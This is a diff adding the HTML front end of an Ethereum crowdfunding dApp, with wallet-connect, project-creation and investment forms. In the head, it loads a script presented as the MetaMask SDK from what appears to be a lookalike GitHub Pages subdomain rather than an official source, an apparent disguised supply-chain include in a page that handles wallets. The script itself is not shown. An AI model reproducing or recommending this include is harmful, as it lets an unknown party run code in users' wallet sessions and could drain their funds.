@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>dApp with MetaMask SDK</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+</head>
+<body>
+  <header>
+    <button id="connectWallet">Connect Wallet</button>
+    <span id="walletAddress"></span>
+  </header>
+
+  <div class="container">
+    <!-- Left Section: Managed Projects -->
+    <div class="managed-projects">
+      <h2>Managed Projects</h2>
+      <div id="createProjectForm">
+        <h3>Create a New Project</h3>
+        <label for="projectName">Project Name:</label>
+        <input type="text" id="projectName" placeholder="Enter project name">
+        <label for="fundingGoal">Funding Goal (ETH):</label>
+        <input type="number" id="fundingGoal" placeholder="Enter funding goal">
+        <label for="duration">Duration (Days):</label>
+        <input type="number" id="duration" placeholder="Enter duration">
+        <button id="createProjectBtn">Create Project</button>
+      </div>
+      <div id="managedProjectsList">
+        <h3>Your Projects</h3>
+        <ul id="managedProjects"></ul>
+      </div>
+    </div>
+
+    <!-- Right Section: Investments -->
+    <div class="investments">
+      <h2>Investments</h2>
+      <div id="investForm">
+        <h3>Invest in a Project</h3>
+        <label for="investProjectId">Select Project:</label>
+        <select id="investProjectId"></select>
+        <label for="investAmount">Investment Amount (ETH):</label>
+        <input type="number" id="investAmount" placeholder="Enter amount">
+        <button id="investBtn">Invest</button>
+      </div>
+      <div id="investedProjectsList">
+        <h3>Your Investments</h3>
+        <ul id="investedProjects"></ul>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
